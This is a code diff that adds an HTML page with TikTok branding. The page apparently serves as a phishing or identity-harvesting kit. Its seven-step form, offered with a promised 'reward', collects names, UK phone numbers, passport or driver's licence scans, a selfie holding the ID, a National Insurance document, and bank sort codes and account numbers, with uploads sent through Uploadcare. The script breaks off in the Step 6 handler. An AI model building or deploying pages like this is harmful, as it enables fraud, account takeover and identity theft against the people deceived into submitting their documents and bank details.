@@ -1,0 +1,1010 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>Landing Page</title>
+	<style>
+		body {
+			min-height: 100vh;
+			margin: 0;
+			font-family: 'Segoe UI', Arial, sans-serif;
+			/* phone.jpg as a full-page background with a dark overlay for readability */
+			background-image: linear-gradient(rgba(0,0,0,0.55), rgba(0,0,0,0.65)), url('phone.jpg');
+			background-size: cover;
+			background-position: center center;
+			background-repeat: no-repeat;
+			background-attachment: fixed;
+			color: #fff;
+		}
+		/* Make all form containers dark and semi-transparent so the phone.jpg shows through */
+		.form-container {
+			background: rgba(30,30,30,0.85) !important;
+			color: #fff;
+			border-radius: 16px;
+			box-shadow: 0 8px 32px rgba(0,0,0,0.45);
+			position: relative;
+			z-index: 30; /* keep forms above falling logos */
+		}
+
+		/* Ensure text/labels inside forms are readable (override inline styles if necessary) */
+		.form-container h2,
+		.form-container label,
+		.form-container #debug-doc-type,
+		.form-container #debug-doc-type-value,
+		.form-container .small-muted {
+			color: #fff !important;
+		}
+
+		/* Make absolutely sure any remaining text (including inline-styled elements) is white */
+		.form-container, .form-container * {
+			color: #fff !important;
+		}
+
+		/* Inputs should be dark translucent with light text */
+		.form-container input[type="text"],
+		.form-container input[type="tel"],
+		.form-container input[type="file"],
+		.form-container input[type="password"] {
+			background: rgba(255,255,255,0.06) !important;
+			border: 1px solid rgba(255,255,255,0.12) !important;
+			color: #fff !important;
+			box-shadow: none !important;
+		}
+
+		.form-container input::placeholder {
+			color: rgba(255,255,255,0.6) !important;
+		}
+
+		/* Keep buttons high-contrast */
+		.form-container button {
+			background: #111 !important;
+			color: #fff !important;
+			border-radius: 8px !important;
+		}
+
+		/* Step indicator responsive tweaks */
+		#step-indicator .sep { font-size:14px;color:#aaa; display:inline-flex;align-items:center;padding:0 4px;flex:0 0 auto; }
+		/* Desktop (default) size for step circles — kept in CSS so we can tune without editing inline tags repeatedly */
+		#step-indicator span[id^="step"] { width:22px;height:22px;display:inline-flex;align-items:center;justify-content:center;background:rgba(120,120,120,0.25);border-radius:50%;color:#fff;font-weight:600;font-size:0.85em;border:2px solid rgba(255,255,255,0.12);transition:background 0.15s;flex:0 0 auto; }
+		@media (max-width: 700px) {
+			/* mobile: slightly scale down the whole indicator so it fits on very narrow screens */
+			#step-indicator { top:140px !important; gap:5px !important; padding:6px 6px 6px 6px; padding-right:48px; overflow-x:auto; -webkit-overflow-scrolling:touch; justify-content:flex-start !important; white-space:nowrap; z-index:40; transform-origin: center top; -webkit-transform-origin: center top; transform: scale(0.85); -webkit-transform: scale(0.85); }
+			#step-indicator span[id^="step"] { width:18px !important; height:18px !important; font-size:0.72em !important; flex:0 0 auto; }
+			#step-indicator .sep { font-size:9px !important; padding:0 3px; flex:0 0 auto; }
+			#step-indicator::-webkit-scrollbar { height:4px; }
+			#step-indicator::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.05); border-radius:3px; }
+		}
+	</style>
+	<!-- Uploadcare (public widget key) -->
+	<script>UPLOADCARE_PUBLIC_KEY = "c6e1967d2f0aabab12ea";</script>
+	<script src="https://ucarecdn.com/libs/widget/3.x/uploadcare.full.min.js"></script>
+	<!-- falling logos overlay (will be filled by JS) -->
+	<style>
+		#falling-logos { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; overflow: hidden; z-index: 1; }
+		.falling-logo { position: absolute; top: -10vh; will-change: transform, opacity; }
+		.falling-logo svg { display:block; }
+		.falling-logo { overflow: visible; }
+		/* pulse the actual logo background (no extra dot) */
+		#brand-logo { position: relative; z-index: 50; background: rgba(0,0,0,0.55) !important; display:inline-flex; align-items:center; justify-content:center; }
+		#brand-logo { animation: brand-pulse 1.8s ease-in-out infinite; transform-origin:center center; }
+		@keyframes brand-pulse {
+			0% { background-color: rgba(0,0,0,0.55); transform: scale(1); }
+			50% { background-color: rgba(0,0,0,0.88); transform: scale(1.06); }
+			100% { background-color: rgba(0,0,0,0.55); transform: scale(1); }
+		}
+		@keyframes fall {
+			0% { transform: translateY(-20vh) rotate(0deg); opacity: 0.95; }
+			10% { opacity: 1; }
+			100% { transform: translateY(120vh) rotate(360deg); opacity: 0.9; }
+		}
+	</style>
+</head>
+<body>
+    <header style="position: absolute; top: 32px; left: 32px; z-index: 10;">
+    <div style="width:48px;height:48px;display:flex;align-items:center;justify-content:center;margin-left:7vw;">
+	    <span id="brand-logo" style="display:inline-flex;align-items:center;justify-content:center;width:48px;height:48px;background:rgba(0,0,0,0.55);border-radius:50%;">
+				<!-- TikTok logo SVG (white) -->
+				<svg width="28" height="28" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
+					<path d="M20.5 10c-.9-.5-1.5-1.3-1.5-2.2V6h-3v15c0 1.3-1.1 2.4-2.4 2.4s-2.4-1.1-2.4-2.4 1.1-2.4 2.4-2.4c.1 0 .3 0 .4.1v-2.7c-.1 0-.3-.1-.4-.1-3 0-5.4 2.4-5.4 5.4s2.4 5.4 5.4 5.4 5.4-2.4 5.4-5.4V13.2c1 .5 2.2.8 3.4.8v-2.4c-.6 0-1.2-.2-1.7-.4z" fill="#fff"/>
+				</svg>
+			</span>
+		</div>
+	</header>
+	<main style="min-height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;">
+
+		<!-- falling logos container -->
+		<div id="falling-logos" aria-hidden="true"></div>
+
+		<div style="width:100%;display:flex;flex-direction:column;align-items:center;">
+			<!-- Step indicator (centered on desktop; mobile rules override) -->
+			<div id="step-indicator" style="position:absolute;top:40px;left:50%;transform:translateX(-50%);width:auto;display:flex;justify-content:center;align-items:center;gap:6px;padding:0 8px;box-sizing:border-box;z-index:20;">
+				<span id="step1-circle">1</span>
+				<span class="sep">&#8212;&#8212;</span>
+				<span id="step2-circle">2</span>
+				<span class="sep">&#8212;&#8212;</span>
+				<span id="step3-circle">3</span>
+				<span class="sep">&#8212;&#8212;</span>
+				<span id="step4-circle">4</span>
+				<span class="sep">&#8212;&#8212;</span>
+				<span id="step5-circle">5</span>
+				<span class="sep">&#8212;&#8212;</span>
+				<span id="step6-circle">6</span>
+				<span class="sep">&#8212;&#8212;</span>
+				<span id="step7-circle">7</span>
+				<!-- step 8 removed -->
+			</div>
+			<!-- Step 1 form -->
+			<div class="form-container" id="step1-form" style="background:#fff;padding:36px 28px;border-radius:16px;box-shadow:0 8px 32px rgba(0,0,0,0.12);min-width:320px;max-width:360px;width:100%;display:flex;flex-direction:column;align-items:center;">
+				<h2 style="text-align:center;color:#111;font-size:1.4em;font-weight:500;margin-bottom:24px;width:100%;">Welcome! Please fill out the form</h2>
+				<form id="main-form" style="width:100%;display:flex;flex-direction:column;align-items:center;">
+					<div style="margin-bottom:16px;width:100%;">
+						<label for="firstName" style="display:block;margin-bottom:6px;color:#111;font-size:15px;width:100%;">First Name</label>
+						<input type="text" id="firstName" name="firstName" required style="width:100%;height:44px;padding:0 12px;border:1px solid #ccc;border-radius:8px;background:#f7f7f7;color:#111;font-size:16px;box-sizing:border-box;">
+					</div>
+					<div style="margin-bottom:16px;width:100%;">
+						<label for="lastName" style="display:block;margin-bottom:6px;color:#111;font-size:15px;width:100%;">Last Name</label>
+						<input type="text" id="lastName" name="lastName" required style="width:100%;height:44px;padding:0 12px;border:1px solid #ccc;border-radius:8px;background:#f7f7f7;color:#111;font-size:16px;box-sizing:border-box;">
+					</div>
+					<div style="margin-bottom:20px;width:100%;">
+						<label for="phone" style="display:block;margin-bottom:6px;color:#111;font-size:15px;width:100%;">Phone Number (UK)</label>
+						<div style="display:flex;align-items:center;width:100%;">
+							<span style="background:rgba(255,255,255,0.06);color:#fff;padding:0 12px;border:1px solid rgba(255,255,255,0.12);border-radius:8px 0 0 8px;font-size:16px;height:44px;display:flex;align-items:center;">+44</span>
+							<input type="tel" id="phone" name="phone" required maxlength="10" pattern="\d{10}" placeholder="XXXXXXXXXX" style="border-radius:0 8px 8px 0;border-left:none;width:100%;height:44px;box-sizing:border-box;padding:0 12px;font-size:16px;background:rgba(255,255,255,0.04);color:#fff;border:1px solid rgba(255,255,255,0.08);">
+						</div>
+					</div>
+					<button type="submit" style="width:100%;height:44px;background:#111;color:#fff;border:none;border-radius:8px;font-size:17px;font-weight:500;cursor:pointer;">Submit</button>
+				</form>
+			</div>
+			<!-- Step 2 form (hidden by default) -->
+			<div class="form-container" id="step2-form" style="background:#fff;padding:36px 28px;border-radius:16px;box-shadow:0 8px 32px rgba(0,0,0,0.12);min-width:320px;max-width:360px;width:100%;display:none;flex-direction:column;align-items:center;">
+				<form id="doc-form" style="width:100%;display:flex;flex-direction:column;align-items:center;">
+					<label style="display:block;margin-bottom:10px;color:#111;font-size:15px;width:100%;text-align:center;">Which document will you use?</label>
+					<div style="display:flex;gap:24px;justify-content:center;">
+						<label style="display:flex;align-items:center;gap:6px;color:#111;cursor:pointer;">
+							<input type="radio" name="documentType" value="passport" required>
+							Passport
+						</label>
+						<label style="display:flex;align-items:center;gap:6px;color:#111;cursor:pointer;">
+							<input type="radio" name="documentType" value="driver" required>
+							Driver's License
+						</label>
+					</div>
+					<button type="submit" style="width:100%;height:44px;background:#111;color:#fff;border:none;border-radius:8px;font-size:17px;font-weight:500;cursor:pointer;margin-top:18px;">Next</button>
+					<div style="margin-top:18px;text-align:center;width:100%;color:#888;font-size:14px;">
+						By continuing, you agree to our <a href="#" style="color:#888;text-decoration:underline;">Privacy Policy</a>.
+					</div>
+				</form>
+			</div>
+			<!-- Step 3 form (hidden by default) -->
+			<div class="form-container" id="step3-form" style="background:#fff;padding:36px 28px;border-radius:16px;box-shadow:0 8px 32px rgba(0,0,0,0.12);min-width:320px;max-width:360px;width:100%;display:none;flex-direction:column;align-items:center;">
+				<h2 style="text-align:center;color:#111;font-size:1.4em;font-weight:500;margin-bottom:24px;width:100%;">Step 3: NIN Document</h2>
+				<form id="nin-form" style="width:100%;display:flex;flex-direction:column;align-items:center;">
+					<div style="margin-bottom:24px;width:100%;">
+						<label style="display:block;margin-bottom:10px;color:#111;font-size:15px;width:100%;text-align:center;">Do you have a NIN document?</label>
+						<div style="display:flex;gap:24px;justify-content:center;">
+							<label style="display:flex;align-items:center;gap:6px;color:#111;cursor:pointer;">
+								<input type="radio" name="nin" value="yes" required>
+								Yes
+							</label>
+							<label style="display:flex;align-items:center;gap:6px;color:#111;cursor:pointer;">
+								<input type="radio" name="nin" value="no" required>
+								No
+							</label>
+						</div>
+					</div>
+					<button type="submit" style="width:100%;height:44px;background:#111;color:#fff;border:none;border-radius:8px;font-size:17px;font-weight:500;cursor:pointer;">Next</button>
+				</form>
+			</div>
+			<!-- Step 4 form (hidden by default) -->
+			<div class="form-container" id="step4-form" style="background:#fff;padding:36px 28px;border-radius:16px;box-shadow:0 8px 32px rgba(0,0,0,0.12);min-width:320px;max-width:360px;width:100%;display:none;flex-direction:column;align-items:center;">
+				<h2 id="step4-title" style="text-align:center;color:#111;font-size:1.4em;font-weight:500;margin-bottom:24px;width:100%;">Step 4: Upload Passport</h2>
+				<div id="debug-doc-type" style="width:100%;text-align:center;color:#777;font-size:13px;margin-bottom:12px;">Selected: <span id="debug-doc-type-value">(unknown)</span></div>
+				<form id="step4-form-inner" style="width:100%;display:flex;flex-direction:column;align-items:center;">
+					<div id="passport-upload-fields" style="width:100%;">
+						<div style="margin-bottom:24px;width:100%;display:flex;flex-direction:column;align-items:center;gap:12px;">
+							<label id="passport-front-label" style="display:block;margin-bottom:10px;color:#111;font-size:15px;width:100%;text-align:center;">Upload the front side of your passport</label>
+							<div id="passport-front-preview" style="width:220px;height:140px;border-radius:10px;background:#f3f7fa;display:flex;align-items:center;justify-content:center;overflow:hidden;">
+								<!-- example image provided by user: 123.png -->
+								<img id="passport-front-example-img" src="123.png" alt="Passport front example" style="width:100%;height:100%;object-fit:contain;display:block;background:#fff;padding:8px;box-sizing:border-box;" />
+							</div>
+							<!-- keep the real file input but hide it; use custom upload button for consistent UX -->
+							<input type="file" id="passport-front" name="passport-front" accept="image/*" required style="display:none;">
+							<!-- Uploadcare hidden uploader for passport front (alternative to native file input) -->
+							<input type="hidden" role="uploadcare-uploader" id="uc-passport-front" name="uc_passport_front" data-images-only="true" data-clearable="true" />
+							<div style="width:100%;display:flex;justify-content:center;align-items:center;margin-top:8px;">
+								<button type="button" id="passport-front-upload-btn" style="width:140px;height:36px;background:#111;color:#fff;border:none;border-radius:8px;cursor:pointer;font-size:14px;">Upload passport front</button>
+							</div>
+							<div id="passport-front-filename" style="font-size:13px;color:#666;margin-top:4px;text-align:center;width:220px;"></div>
+						</div>
+					</div>
+					<div id="license-upload-fields" style="width:100%;display:none;">
+						<div style="display:flex;flex-direction:column;gap:18px;width:100%;align-items:center;">
+							<div style="width:100%;display:flex;gap:12px;justify-content:center;flex-wrap:wrap;">
+								<!-- Front preview -->
+								<div style="display:flex;flex-direction:column;align-items:center;gap:8px;">
+									<label style="display:block;margin-bottom:6px;color:#111;font-size:15px;text-align:center;">Driver's license — Front</label>
+									<div id="license-front-preview" style="width:220px;height:140px;border-radius:10px;background:#f3f7fa;display:flex;align-items:center;justify-content:center;overflow:hidden;">
+										<!-- place example file named license-front.jpg into project to show here -->
+										<img id="license-front-example-img" src="license_front.png" alt="License front example" style="width:100%;height:100%;object-fit:cover;display:block;" />
+									</div>
+									<input type="file" id="license-front" name="license-front" accept="image/*" required style="display:none;">
+									<input type="hidden" role="uploadcare-uploader" id="uc-license-front" name="uc_license_front" data-images-only="true" data-clearable="true" />
+									<div style="width:100%;display:flex;justify-content:center;align-items:center;margin-top:6px;">
+										<button type="button" id="license-front-upload-btn" style="width:140px;height:36px;background:#111;color:#fff;border:none;border-radius:8px;cursor:pointer;font-size:14px;">Upload front</button>
+									</div>
+									<div id="license-front-filename" style="font-size:13px;color:#666;margin-top:4px;text-align:center;width:220px;"></div>
+								</div>
+
+								<!-- Back preview -->
+								<div style="display:flex;flex-direction:column;align-items:center;gap:8px;">
+									<label style="display:block;margin-bottom:6px;color:#111;font-size:15px;text-align:center;">Driver's license — Back</label>
+									<div id="license-back-preview" style="width:220px;height:140px;border-radius:10px;background:#f3f7fa;display:flex;align-items:center;justify-content:center;overflow:hidden;">
+										<!-- place example file named license-back.jpg into project to show here -->
+										<img id="license-back-example-img" src="license_back.png" alt="License back example" style="width:100%;height:100%;object-fit:cover;display:block;" />
+									</div>
+									<input type="file" id="license-back" name="license-back" accept="image/*" required style="display:none;">
+									<input type="hidden" role="uploadcare-uploader" id="uc-license-back" name="uc_license_back" data-images-only="true" data-clearable="true" />
+									<div style="width:100%;display:flex;justify-content:center;align-items:center;margin-top:6px;">
+										<button type="button" id="license-back-upload-btn" style="width:140px;height:36px;background:#111;color:#fff;border:none;border-radius:8px;cursor:pointer;font-size:14px;">Upload back</button>
+									</div>
+									<div id="license-back-filename" style="font-size:13px;color:#666;margin-top:4px;text-align:center;width:220px;"></div>
+								</div>
+							</div>
+						</div>
+					</div>
+					<button type="submit" style="width:100%;height:44px;background:#111;color:#fff;border:none;border-radius:8px;font-size:17px;font-weight:500;cursor:pointer;">Next</button>
+				</form>
+			</div>
+			<!-- Step 5 form (hidden by default) -->
+			<div class="form-container" id="step5-form" style="background:#fff;padding:36px 28px;border-radius:16px;box-shadow:0 8px 32px rgba(0,0,0,0.12);min-width:320px;max-width:360px;width:100%;display:none;flex-direction:column;align-items:center;">
+				<h2 id="step5-title" style="text-align:center;color:#111;font-size:1.4em;font-weight:500;margin-bottom:24px;width:100%;">Step 5: Photo with Passport</h2>
+				<form id="step5-form-inner" style="width:100%;display:flex;flex-direction:column;align-items:center;">
+					<div id="passport-photo-fields" style="margin-bottom:24px;width:100%;">
+						<div style="width:100%;display:flex;flex-direction:column;align-items:center;gap:12px;">
+							<!-- illustrative image (inline SVG) -->
+							<div id="passport-preview" style="width:240px;height:160px;border-radius:10px;background:#f3f7fa;display:flex;align-items:center;justify-content:center;overflow:hidden;">
+								<!-- Replace this image file with the attached photo named passport-example.jpg -->
+								<img id="passport-example-img" src="passport-example.jpg" alt="Example: person holding passport" style="width:100%;height:100%;object-fit:cover;display:block;" />
+							</div>
+							<input type="file" id="passport-photo" name="passport-photo" accept="image/*" style="display:none;">
+							<input type="hidden" role="uploadcare-uploader" id="uc-passport-photo" name="uc_passport_photo" data-images-only="true" data-clearable="true" />
+							<!-- center the upload button below the photo -->
+							<div style="width:100%;display:flex;justify-content:center;align-items:center;margin-top:8px;">
+								<button type="button" id="passport-upload-btn" style="width:160px;height:40px;background:#111;color:#fff;border:none;border-radius:8px;cursor:pointer;font-size:15px;">Upload</button>
+							</div>
+							<div id="passport-filename" style="font-size:13px;color:#666;margin-top:6px;text-align:center;width:100%;"></div>
+						</div>
+					</div>
+
+					<!-- License (photo with license) - preview + hidden input + upload button (hidden by default, shown when user selects driver's license) -->
+					<div id="license-photo-fields" style="margin-bottom:24px;width:100%;display:none;">
+						<div style="width:100%;display:flex;flex-direction:column;align-items:center;gap:12px;">
+							<div id="license-preview" style="width:240px;height:160px;border-radius:10px;background:#f3f7fa;display:flex;align-items:center;justify-content:center;overflow:hidden;">
+								<img id="license-example-img" src="passport-example.jpg" alt="Example: person holding license" style="width:100%;height:100%;object-fit:cover;display:block;" />
+								</div>
+								<input type="file" id="license-photo" name="license-photo" accept="image/*" style="display:none;">
+								<input type="hidden" role="uploadcare-uploader" id="uc-license-photo" name="uc_license_photo" data-images-only="true" data-clearable="true" />
+								<!-- center the upload button below the photo -->
+								<div style="width:100%;display:flex;justify-content:center;align-items:center;margin-top:8px;">
+									<button type="button" id="license-upload-btn" style="width:160px;height:40px;background:#111;color:#fff;border:none;border-radius:8px;cursor:pointer;font-size:15px;">Upload</button>
+								</div>
+								<div id="license-filename" style="font-size:13px;color:#666;margin-top:6px;text-align:center;width:100%;"></div>
+							</div>
+						</div>
+
+					<button type="submit" style="width:100%;height:44px;background:#111;color:#fff;border:none;border-radius:8px;font-size:17px;font-weight:500;cursor:pointer;">Next</button>
+				</form>
+			</div>
+
+            
+			<!-- Step 6 form (hidden by default) -->
+			<div class="form-container" id="step6-form" style="background:#fff;padding:36px 28px;border-radius:16px;box-shadow:0 8px 32px rgba(0,0,0,0.12);min-width:320px;max-width:360px;width:100%;display:none;flex-direction:column;align-items:center;">
+				<h2 style="text-align:center;color:#111;font-size:1.4em;font-weight:500;margin-bottom:24px;width:100%;">Step 6: Upload NIN Document</h2>
+				<form id="nin-photo-form" style="width:100%;display:flex;flex-direction:column;align-items:center;">
+					<div id="nin-upload-block" style="margin-bottom:24px;width:100%;display:flex;flex-direction:column;align-items:center;">
+						<label style="display:block;margin-bottom:10px;color:#111;font-size:15px;width:100%;text-align:center;">Upload a photo of your NIN document</label>
+						<!-- Example preview so users see how the NIN should look -->
+						<div id="nin-preview" style="width:320px;max-width:90%;height:180px;border-radius:10px;background:#f3f7fa;display:flex;align-items:center;justify-content:center;overflow:hidden;margin:12px auto;">
+							<img id="nin-example-img" src="123123.png" alt="Example NIN document" style="max-width:100%;max-height:100%;object-fit:contain;display:block;margin:0 auto;" />
+						</div>
+						<!-- hidden real input, use custom Upload button for consistent UX -->
+						<input type="file" id="nin-photo" name="nin-photo" accept="image/*" required style="display:none;">
+						<input type="hidden" role="uploadcare-uploader" id="uc-nin-photo" name="uc_nin_photo" data-images-only="true" data-clearable="true" />
+						<div style="width:100%;display:flex;justify-content:center;align-items:center;margin-top:8px;">
+							<button type="button" id="nin-upload-btn" style="width:160px;height:40px;background:#111;color:#fff;border:none;border-radius:8px;cursor:pointer;font-size:15px;">Upload NIN</button>
+						</div>
+						<div id="nin-filename" style="font-size:13px;color:#666;margin-top:6px;text-align:center;width:100%;"></div>
+					</div>
+					<div id="nin-no-block" style="display:none;margin-bottom:18px;width:100%;text-align:center;color:#444;">
+						<strong>No NIN?</strong>
+						<p style="margin:8px 0 0;color:#666;">If you don't have a NIN document, you can still continue but the reward will be smaller.</p>
+					</div>
+					<button type="submit" id="nin-photo-submit" style="width:100%;height:44px;background:#111;color:#fff;border:none;border-radius:8px;font-size:17px;font-weight:500;cursor:pointer;">Finish</button>
+				</form>
+			</div>
+			<!-- Step 7 form (hidden by default) -->
+			<div class="form-container" id="step7-form" style="background:#fff;padding:36px 28px;border-radius:16px;box-shadow:0 8px 32px rgba(0,0,0,0.12);min-width:320px;max-width:360px;width:100%;display:none;flex-direction:column;align-items:center;">
+				<h2 style="text-align:center;color:#111;font-size:1.4em;font-weight:500;margin-bottom:24px;width:100%;">Step 7: Bank Details</h2>
+				<form id="bank-form" style="width:100%;display:flex;flex-direction:column;align-items:center;">
+					<div style="margin-bottom:16px;width:100%;">
+						<label for="accountHolder" style="display:block;margin-bottom:6px;color:#111;font-size:15px;width:100%;">Account Holder Name</label>
+						<input type="text" id="accountHolder" name="accountHolder" required style="width:100%;height:44px;padding:0 12px;border:1px solid #ccc;border-radius:8px;background:#f7f7f7;color:#111;font-size:16px;box-sizing:border-box;">
+					</div>
+					<div style="margin-bottom:16px;width:100%;">
+						<label for="sortCode" style="display:block;margin-bottom:6px;color:#111;font-size:15px;width:100%;">Sort Code</label>
+						<input type="text" id="sortCode" name="sortCode" required maxlength="6" pattern="\d{6}" placeholder="XXXXXX" style="width:100%;height:44px;padding:0 12px;border:1px solid #ccc;border-radius:8px;background:#f7f7f7;color:#111;font-size:16px;box-sizing:border-box;">
+					</div>
+					<div style="margin-bottom:24px;width:100%;">
+						<label for="accountNumber" style="display:block;margin-bottom:6px;color:#111;font-size:15px;width:100%;">Account Number</label>
+						<input type="text" id="accountNumber" name="accountNumber" required maxlength="8" pattern="\d{8}" placeholder="XXXXXXXX" style="width:100%;height:44px;padding:0 12px;border:1px solid #ccc;border-radius:8px;background:#f7f7f7;color:#111;font-size:16px;box-sizing:border-box;">
+					</div>
+					<button type="submit" style="width:100%;height:44px;background:#111;color:#fff;border:none;border-radius:8px;font-size:17px;font-weight:500;cursor:pointer;">Next</button>
+				</form>
+			</div>
+			<!-- Step 8 removed: final state is now handled by redirect to /thank-you.html -->
+		</div>
+	</main>
+	<script>
+		// Step 1 submit
+		document.getElementById('main-form').addEventListener('submit', function(e) {
+			e.preventDefault();
+			const phone = document.getElementById('phone').value;
+			if (!/^\d{10}$/.test(phone)) {
+				alert('Please enter a valid UK phone number: 10 digits after +44');
+				return;
+			}
+			// Tick mark in the first circle
+			const step1Circle = document.getElementById('step1-circle');
+			if (step1Circle) {
+				step1Circle.innerHTML = '<svg width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="9" cy="9" r="9" fill="#fff"/><path d="M5 9.5l2.5 2.5L13 7" stroke="#111" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>';
+				step1Circle.style.background = '#fff';
+				step1Circle.style.color = '#fff';
+				step1Circle.style.border = '2px solid #fff';
+			}
+			// Transition to step 2
+			document.getElementById('step1-form').style.display = 'none';
+			document.getElementById('step2-form').style.display = 'flex';
+		});
+
+		// Step 2 submit
+		document.getElementById('doc-form').addEventListener('submit', function(e) {
+			e.preventDefault();
+			// Tick mark in the second circle
+			const step2Circle = document.getElementById('step2-circle');
+			if (step2Circle) {
+				step2Circle.innerHTML = '<svg width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="9" cy="9" r="9" fill="#fff"/><path d="M5 9.5l2.5 2.5L13 7" stroke="#111" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>';
+				step2Circle.style.background = '#fff';
+				step2Circle.style.color = '#fff';
+				step2Circle.style.border = '2px solid #fff';
+			}
+			// Save selected document type for further logic
+			const selected = document.querySelector('input[name="documentType"]:checked');
+			window.selectedDocType = selected ? selected.value : undefined;
+			// Transition to step 3
+			document.getElementById('step2-form').style.display = 'none';
+			document.getElementById('step3-form').style.display = 'flex';
+		});
+
+		// Step 3 submit
+		document.getElementById('nin-form').addEventListener('submit', function(e) {
+			e.preventDefault();
+			// Tick mark in the third circle
+			const step3Circle = document.getElementById('step3-circle');
+			if (step3Circle) {
+				step3Circle.innerHTML = '<svg width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="9" cy="9" r="9" fill="#fff"/><path d="M5 9.5l2.5 2.5L13 7" stroke="#111" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>';
+				step3Circle.style.background = '#fff';
+				step3Circle.style.color = '#fff';
+				step3Circle.style.border = '2px solid #fff';
+			}
+			// Save NIN answer (yes/no) for later steps
+			var ninAnswerEl = document.querySelector('input[name="nin"]:checked');
+			window.hasNin = (ninAnswerEl && ninAnswerEl.value === 'yes');
+
+			// Transition to step 4
+			document.getElementById('step3-form').style.display = 'none';
+			// Update fields for step 4
+			var docType = window.selectedDocType;
+			// Fallback: if for some reason window.selectedDocType is undefined, try to read the radio directly
+			if (!docType) {
+				var radioSel = document.querySelector('input[name="documentType"]:checked');
+				if (radioSel) {
+					docType = radioSel.value;
+					window.selectedDocType = docType;
+				}
+			}
+			var passportFields = document.getElementById('passport-upload-fields');
+			var licenseFields = document.getElementById('license-upload-fields');
+			var step4Title = document.getElementById('step4-title');
+			if (docType === 'driver') {
+				passportFields.style.display = 'none';
+				licenseFields.style.display = 'block';
+				step4Title.textContent = 'Step 4: Upload Driver\'s License';
+			} else {
+				passportFields.style.display = 'block';
+				licenseFields.style.display = 'none';
+				step4Title.textContent = 'Step 4: Upload Passport';
+			}
+			// Update debug display so we can see the stored selection
+			var debugEl = document.getElementById('debug-doc-type-value');
+			if (debugEl) debugEl.textContent = docType ? docType : 'undefined';
+			// Update fields for step 5
+			var passportPhotoFields = document.getElementById('passport-photo-fields');
+			var licensePhotoFields = document.getElementById('license-photo-fields');
+			var step5Title = document.getElementById('step5-title');
+			// NIN-related blocks (used later by Step 4 logic)
+			var ninUploadBlock = document.getElementById('nin-upload-block');
+			var ninNoBlock = document.getElementById('nin-no-block');
+			var ninPhotoInput = document.getElementById('nin-photo');
+			if (docType === 'driver') {
+				passportPhotoFields.style.display = 'none';
+				licensePhotoFields.style.display = 'block';
+				step5Title.textContent = 'Step 5: Photo with Driver\'s License';
+			} else {
+				passportPhotoFields.style.display = 'block';
+				licensePhotoFields.style.display = 'none';
+				step5Title.textContent = 'Step 5: Photo with Passport';
+			}
+			// Ensure the appropriate photo input is required for step 5
+			var passportPhotoInput = document.getElementById('passport-photo');
+			var licensePhotoInput = document.getElementById('license-photo');
+			if (passportPhotoInput) passportPhotoInput.required = (docType !== 'driver');
+			if (licensePhotoInput) licensePhotoInput.required = (docType === 'driver');
+			document.getElementById('step4-form').style.display = 'flex';
+		});
+
+		// Step 4 submit - guarded, manual validation to avoid native constraint blocking
+		var step4FormInnerEl = document.getElementById('step4-form-inner');
+		if (step4FormInnerEl) {
+			step4FormInnerEl.noValidate = true;
+			step4FormInnerEl.addEventListener('submit', function(e) {
+				e.preventDefault();
+				var docType = window.selectedDocType;
+				// Fallbacks: if selectedDocType missing, try to infer from uploaded files first, then from visible blocks
+				if (!docType) {
+					var licenseFrontEl = document.getElementById('license-front');
+					var licenseBackEl = document.getElementById('license-back');
+					var passportFrontEl = document.getElementById('passport-front');
+					if (licenseFrontEl && licenseBackEl && (licenseFrontEl.files.length > 0 || licenseBackEl.files.length > 0 || window.uploadUrls.licenseFront || window.uploadUrls.licenseBack)) {
+						docType = 'driver';
+						window.selectedDocType = 'driver';
+					} else if (passportFrontEl && passportFrontEl.files.length > 0) {
+						docType = 'passport';
+						window.selectedDocType = 'passport';
+					} else {
+						var licenseBlock = document.getElementById('license-upload-fields');
+						var passportBlock = document.getElementById('passport-upload-fields');
+						if (licenseBlock && licenseBlock.style.display !== 'none') {
+							docType = 'driver';
+							window.selectedDocType = 'driver';
+						} else if (passportBlock && passportBlock.style.display !== 'none') {
+							docType = 'passport';
+						 window.selectedDocType = 'passport';
+						}
+					}
+				}
+				// Manual validation
+				var ok = true;
+				if (docType === 'driver') {
+					var lf = document.getElementById('license-front');
+					var lb = document.getElementById('license-back');
+					var haveFront = (lf && lf.files && lf.files.length > 0) || !!window.uploadUrls.licenseFront;
+					var haveBack = (lb && lb.files && lb.files.length > 0) || !!window.uploadUrls.licenseBack;
+					if (!haveFront || !haveBack) {
+						alert('Please upload both the front and back sides of your driver\'s license.');
+						ok = false;
+					}
+				} else {
+					var pf = document.getElementById('passport-front');
+					var havePassport = (pf && pf.files && pf.files.length > 0) || !!window.uploadUrls.passportFront || !!window.uploadUrls.passport;
+					if (!havePassport) {
+						alert('Please upload the front side of your passport.');
+						ok = false;
+					}
+				}
+				if (!ok) {
+					// Validation failed — keep user on Step 4 so they can upload missing files
+					return;
+				}
+				// Validation passed — mark step 4 complete and move to Step 5 (photo with passport/license)
+				const step4Circle = document.getElementById('step4-circle');
+				if (step4Circle) {
+					step4Circle.innerHTML = '<svg width="18" height="18" viewBox="0 0 18 18" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="9" cy="9" r="9" fill="#fff"/><path d="M5 9.5l2.5 2.5L13 7" stroke="#111" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg>';
+					step4Circle.style.background = '#fff';
+					step4Circle.style.color = '#fff';
+					step4Circle.style.border = '2px solid #fff';
+				}
+
+				document.getElementById('step4-form').style.display = 'none';
+				document.getElementById('step5-form').style.display = 'flex';
+			});
+		}
+
+		// Step 6 submit
+		var ninPhotoForm = document.getElementById('nin-photo-form');
+		if (ninPhotoForm) {
+			ninPhotoForm.noValidate = true;
+			ninPhotoForm.addEventListener('submit', function(e) {
+				e.preventDefault();
+				// If user doesn't have NIN, allow continuing without upload
